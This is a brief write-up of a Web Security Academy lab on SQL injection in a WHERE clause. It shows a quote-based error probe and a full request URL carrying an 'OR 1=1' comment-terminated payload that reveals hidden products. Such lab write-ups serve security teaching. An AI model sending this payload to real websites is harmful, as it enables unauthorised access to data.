# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

1. Inject a single quote and note the error
2. Send the following request to show all products

```
https://0a8f002f04e6cbc080afdac500640069.web-security-academy.net/filter?category=Lifestyle'+OR+1%3d1--+-
```

